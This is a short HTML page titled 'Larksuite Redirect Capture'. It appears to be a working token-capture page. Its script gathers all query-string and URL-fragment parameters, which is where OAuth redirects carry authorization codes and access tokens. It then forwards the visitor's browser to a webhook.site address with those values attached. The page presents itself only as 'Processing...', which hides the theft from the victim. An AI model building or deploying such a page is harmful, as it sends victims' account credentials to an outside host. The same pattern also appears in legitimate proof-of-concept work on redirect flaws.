<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Larksuite Redirect Capture</title>
</head>
<body>
<h2>Processing...</h2>

<script>
  const fullUrl = window.location.href;
  const url = new URL(fullUrl);
  const params = new URLSearchParams(url.search);

  if (url.hash) {
    const hashParams = new URLSearchParams(url.hash.substring(1));
    hashParams.forEach((value, key) => {
      params.set(key, value);
    });
  }

  const WEBHOOK_URL = "https://webhook.site/97626eba-b43c-4550-971e-28dbe03fbf7c";
  const target = `${WEBHOOK_URL}?${params.toString()}`;
  window.location.href = target;
</script>
</body>
</html>
